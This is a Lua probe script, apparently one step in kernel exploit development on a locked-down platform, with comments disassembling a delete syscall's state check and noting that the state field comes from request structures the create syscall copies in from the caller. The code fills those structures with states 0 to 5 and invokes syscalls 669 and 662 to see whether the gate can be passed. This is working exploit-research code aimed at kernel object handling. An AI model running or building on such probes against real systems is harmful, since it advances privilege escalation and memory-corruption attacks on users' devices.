-- CRASH_CLASS: HIGH
-- PROBE 488f: the create copyins our data; the delete type-gate may read it
-- 13.60 delete: 0x3afd76 mov eax,[r14+8]; add eax,-3; cmp eax,2; jae -> write
-- 0x80020010. That is "object state must be 3 or 4". If [obj+8] comes from the
-- 0x28-byte request structs the create copied in, we can set it ourselves.
-- Pointers stay NULL so nothing is freed yet; only the gate is under test.
print("=== PROBE 488f: request state gate ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
local sc669 = make_syscall(669)
local sc662 = make_syscall(662)
local function clear_data()
  for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
end
local function run(state, label)
  clear_data()
  for i = 0, 3 do pcall(function() memory.write_dword(data + i * 0x28 + 8, state) end) end
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(4), uint64(1), uint64(out)) end)
  if not ok then print(label .. " create crashed"); return end
  local id = to_num(memory.read_dword(out))
  pcall(function() memory.write_dword(ids, id) end)
  pcall(function() memory.write_dword(res, 0x42424242) end)
  local ok2, rv2 = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res)) end)
  local st = ok2 and to_num(memory.read_dword(res)) or -1
  print(string.format("%-10s create ret=%d id=%d delete ret=%s status=%#x", label, to_num(rv), id,
        ok2 and tostring(to_num(rv2)) or "-", st))
end
for _, s in ipairs({0, 1, 2, 3, 4, 5}) do run(s, "state=" .. s) end
print("=== PROBE 488f COMPLETE ===")
